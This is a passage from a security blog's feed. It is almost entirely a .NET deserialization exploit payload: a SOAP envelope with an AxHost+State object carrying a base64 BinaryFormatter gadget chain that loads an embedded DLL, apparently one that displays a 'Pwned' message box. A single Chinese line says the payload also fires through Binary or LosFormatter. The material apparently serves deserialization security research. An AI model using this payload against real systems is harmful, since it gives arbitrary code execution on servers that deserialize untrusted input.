class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:SOAP-ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xm</span></span></span><br><span class="line"><span class="tag"><span class="attr">lns:SOAP-ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:clr</span>=<span class="string">&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot;</span> <span class="attr">SOAP-ENV:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/enc</span></span></span><br><span class="line"><span class="string"><span class="tag">oding/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a1:AxHost_x002B_State</span> <span class="attr">id</span>=<span class="string">&quot;ref-1&quot;</span> <span class="attr">xmlns:a1</span>=<span class="string">&quot;http://schemas.microsoft.com/clr/nsassem/System.Windows.Forms/System.Windows.Forms%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20P</span></span></span><br><span class="line"><span class="string"><span class="tag">ublicKeyToken%3Db77a5c561934e089&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PropertyBagBinary</span> <span class="attr">href</span>=<span class="string">&quot;#ref-3&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a1:AxHost_x002B_State</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENC:Array</span> <span class="attr">id</span>=<span class="string">&quot;ref-3&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;SOAP-ENC:base64&quot;</span>&gt;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuM</span><br><span class="line">C4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAABwAAAAcAAAAQAgAAAAgAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAA</span><br><span class="line">CQgAAAAJCQAAAAoMCgAAAGFTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQMAAABqU3lzdGVtLldvcmtmbG9</span><br><span class="line">3LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFH1N5c3RlbS5Vbml0eVNlcmlhbG</span><br><span class="line">l6YXRpb25Ib2xkZXIKAAAACQsAAAAJDAAAAAEEAAAAAwAAAAkNAAAACQ4AAAABBQAAAAMAAAAJDwAAAAkQAAAAAQYAAAADAAAACREAAAAJEgAAAAEHAAAAAwAAAAkTAAAACRQAAAABCAAAAAMAAAAJFQAAAAkWAAAABAkAAAAcU3lzdGVtL</span><br><span class="line">kNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0</span><br><span class="line">ZW0uQ29sbGVjdGlvbnMuSUhhc2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJFwAAAAkYAAAABAsAAAAfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgMAAAAERGF0YQlVbml0eVR5cGUMQXNzZW1ibHlOYW1lAQABCAYZAAA</span><br><span class="line">A+AFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0TGlzdEl0ZXJhdG9yYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNT</span><br><span class="line">YxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAGGgAAAE5TeXN0ZW0uQ</span><br><span class="line">29yZSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQDAAAAAcAAAAJGwAAAAoJHAAAAAkdAAAACAgAAAAACggIAQAAAAENAAAACwAAAAYeAAAA+AFTeXN0ZW0uTGlu</span><br><span class="line">cS5FbnVtZXJhYmxlKzxTZWxlY3RNYW55SXRlcmF0b3I+ZF9fMTdgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTV</span><br><span class="line">jNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJGgAAABAOAAAACQAAAAgI/v///woICAEAAA</span><br><span class="line">AKCQMAAAAKCSEAAAANAgEPAAAACwAAAAYiAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlP</span><br><span class="line">W5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODld</span><br><span class="line">XQQAAAAJGgAAABAQAAAABwAAAAkEAAAACgklAAAACggIAAAAAAoICAEAAAABEQAAAAsAAAAGJgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGJwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4</span><br><span class="line">wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRASAAAABwAAAAkFAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARMAAAALAAAABikAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2</span><br><span class="line">lnbi5EZXNpZ25lclZlcmIEAAAABioAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAUAAAABQAAAA0CCSsAAAAICAMAAAAJCAAAAAEVAAAACwAAA</span><br><span class="line">AYtAAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABi4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1</span><br><span class="line">NjE5MzRlMDg5EBYAAAABAAAACQYAAAAQFwAAAAIAAAAJBwAAAAkHAAAAEBgAAAACAAAABjEAAAAACTEAAAAEGwAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9</span><br><span class="line">uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24DAAAPU3lzdGVtLkJ5dGVbXVtdCAgJMgAAAAEAAAABAAAABBwAAAAiU3lzdGVtLk</span><br><span class="line">RlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgIAAAAIRGVsZWdhdGUHbWV0aG9kMAMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsa</span><br><span class="line">XphdGlvbkhvbGRlcgkzAAAACTQAAAAEHQAAAIoBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxK0VudW1lcmF0b3JbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwg</span><br><span class="line">UHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAARsaXN0BWluZGV4B3ZlcnNpb24HY3VycmVudAMAAAd/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2l</span><br><span class="line">vbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgIAgoAAAAAAAAAAAoBIQAAABwAAAAJNQAAAAk2AAAAASUAAAAcAAAACTcAAAAJOAAAAAErAAAAAwAAAAk5AAAACToAAAAHMg</span><br><span class="line">AAAAEBAAAABAAAAAcCCTsAAAAKCgoEMwAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZ</span><br><span class="line">QptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQY8AAAA1QFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lv</span><br><span class="line">bj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCB</span><br><span class="line">QdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAY+AAAAGlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5Bj8AAAAETG9hZAoENAAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbk</span><br><span class="line">hvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JPwAAAAkuAAAACT4AAAAGQgAAACdTeXN0Z</span><br><span class="line">W0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGQwAAAC5TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoBNQAAADMAAAAGRAAAAMwCU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlJlZmxl</span><br><span class="line">Y3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDF</span><br><span class="line">bW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cm</span><br><span class="line">FsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAk+AAAABkcAAAAIR2V0VHlwZXMKATYAAAA0AAAACUcAAAAJLgAAAAk+AAAABkoAAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpBksAAAAYU3lzdGVtL</span><br><span class="line">lR5cGVbXSBHZXRUeXBlcygpCAAAAAoBNwAAADMAAAAGTAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYx</span><br><span class="line">OTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCS4AAAAKCS4AAAAGTgAAABBTeXN0ZW0uQWN0aXZhdG9</span><br><span class="line">yBk8AAAAOQ3JlYXRlSW5zdGFuY2UKATgAAAA0AAAACU8AAAAJLgAAAAlOAAAABlIAAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGUwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS</span><br><span class="line">5UeXBlKQgAAAAKATkAAAALAAAABlQAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACSoAAAAQOgAAAAIAAAAJVgAAAAgIACAAAA87AAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMARnHPZQAAAAAAAAAA4AAiIAsBMAAACgAAAAYAAAAA</span><br><span class="line">AAAuKAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAYAAAAAAAAAAIAAAAACAAAAAAAAAwBghQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA3CcAAE8AAAAAQAAAeAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAKQmAAA</span><br><span class="line">cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAAAAAALnRleHQAAAA0CAAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAeAMAAABAAAAABA</span><br><span class="line">AAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAABAoAAAAAAAASAAAAAIABQB4IAAALAYAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcgIoDwAACgAAcgEAAHByAQAAcBYfECgQAAAKJioiAHMBAAAGJioAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAPABAAAjfgAAXAIAAJgCAAAjU3RyaW5ncwAAAAD0BAAAEAAA</span><br><span class="line">ACNVUwAEBQAAEAAAACNHVUlEAAAAFAUAABgBAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAUAAAAAgAAAAIAAAABAAAAEAAAAA4AAAABAAAAAgAAAAAAnAEBAAAAAAAGAPcADwIGAGQBDwIGACsA3QEPAC8CAAAGAFM</span><br><span class="line">AxQEGANoAxQEGALsAxQEGAEsBxQEGABcBxQEGADABxQEGAGoAxQEGAD8A8AEGAB0A8AEGAJ4AxQEGAIUAggEGAHMCqgEKAIwCQwIKAHoCQwIKAFgCQwIKALYBQwIAAAAAAQAAAAAAAQABAAEAEABqAgAAQQABAAEAUCAAAAAAhhjXAQYAAQ</span><br><span class="line">BtIAAAAACWALEBLgABAAAAAQA+AgkA1wEBABEA1wEGABkA1wEKACkA1wEQADEA1wEQADkA1wEQAEEA1wEQAEkA1wEQAFEA1wEQAFkA1wEQAGEA1wEVAGkA1wEQAHEA1wEQAHkA1wEQAIEA1wEGAIkAhwIaAC4ACwA0AC4AEwA9AC4AGwBcA</span><br><span class="line">C4AIwBlAC4AKwB0AC4AMwB0AC4AOwB0AC4AQwBlAC4ASwB6AC4AUwB0AC4AWwB0AC4AYwCSAC4AawC8AC4AcwDJAASAAAABAAAAAAAAAAAAAAAAAAoAAAAEAAAAAAAAAAAAAAAlABQAAAAAAAQAAAAAAAAAAAAAACUAQwIAAAAAAAAAPE1v</span><br><span class="line">ZHVsZT4ARXhwQ2xhc3NhAG1zY29ybGliAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V</span><br><span class="line">0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dH</span><br><span class="line">JpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLlZlcnNpb</span><br><span class="line">25pbmcARXhwQ2xhc3NhLmRsbABTeXN0ZW0ATWFpbgBNZXNzYWdlQm94SWNvbgBTeXN0ZW0uUmVmbGVjdGlvbgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1l</span><br><span class="line">LkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYXJncwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBNZXNzYWdlQm94QnV0dG9ucwBFeHBDbGFzcwBPYmplY3QARGlhbG9nUmVzdWx0AFNob3cATWVzc2FnZUJveAAAAAtQAHcAbgBlAGQ</span><br><span class="line">AAAAAAK00MrKVZahFsxPKH8HhthQABCABAQgDIAABBSABARERBCABAQ4EIAEBAgoABBFJDg4RTRFRCLd6XFYZNOCJBQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAcBAAAAAA4BAAlFeHBDbGFzc2</span><br><span class="line">EAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjQAACkBACRBQzhERjFBRi03MjBELTRCRTctQUU0MC05MEQzRjU3RDhBQjAAAAwBAAcxLjAuMC4wAABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjUuMgEAVA4URnJhbWV3b3JrR</span><br><span class="line">GlzcGxheU5hbWUULk5FVCBGcmFtZXdvcmsgNC41LjIAAAAAAEZxz2UAAAAAAgAAABwBAADAJgAAwAgAAFJTRFMEtmaoGwdvTKnj5k/WPUylAQAAAEU6XENURkxlYXJuaW5nXOW8gOWPkeWtpuS5oFxDc2hhcnBMZWFybmluZ1xFeHBDbGFz</span><br><span class="line">c2FcRXhwQ2xhc3NhXG9ialxEZWJ1Z1xFeHBDbGFzc2EucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCgAAAAAAAAAAAAAHigAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAoAAAAAAAAAAAAAAAAX0Nvck</span><br><span class="line">RsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAI</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAHAMAAAAAAAAAAAAAHAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEA</span><br><span class="line">AAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMA</span><br><span class="line">bwBtAG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA8AAoAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AHAAQwBsAGEAcwBzAGEAAAAwAAgAAQBGAGkAbABlAFYAZQB</span><br><span class="line">yAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA8AA4AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABwAEMAbABhAHMAcwBhAC4AZABsAGwAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AH</span><br><span class="line">IAaQBnAGgAdAAgAKkAIAAgADIAMAAyADQAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEQADgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAHgAcABDAGwAYQBzAHMAYQAuAGQAb</span><br><span class="line">ABsAAAANAAKAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABFAHgAcABDAGwAYQBzAHMAYQAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABW</span><br><span class="line">AGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAAwOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAEVgAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAAAAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL+wCgyQ8m9ws=<span class="tag">&lt;/<span class="name">SOAP-ENC:Array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终soap的payload如上。换成Binary或者Los都是一样可以触发的。</p>]]></content>
    
    
    <summary type="html">我测你DOTNET</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="反序列化" scheme="http://boogipop.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term=".NET" scheme="http://boogipop.com/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>易懂的Rome反序列化利用链(updated)</title>
    <link href="http://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>http://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2024-02-12T07:05:22.000Z</published>
    <updated>2024-02-12T07:05:22.000Z</updated>
    
